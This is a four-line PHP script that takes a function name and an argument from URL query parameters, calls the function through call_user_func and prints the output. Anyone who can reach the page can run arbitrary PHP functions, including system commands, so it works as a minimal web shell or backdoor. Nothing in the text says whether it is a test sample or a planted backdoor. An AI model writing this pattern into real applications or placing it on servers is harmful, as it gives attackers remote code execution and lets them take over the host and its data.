<?php
$evaledres = call_user_func($_GET['func'], $_GET['args']);
print($evaledres);
?>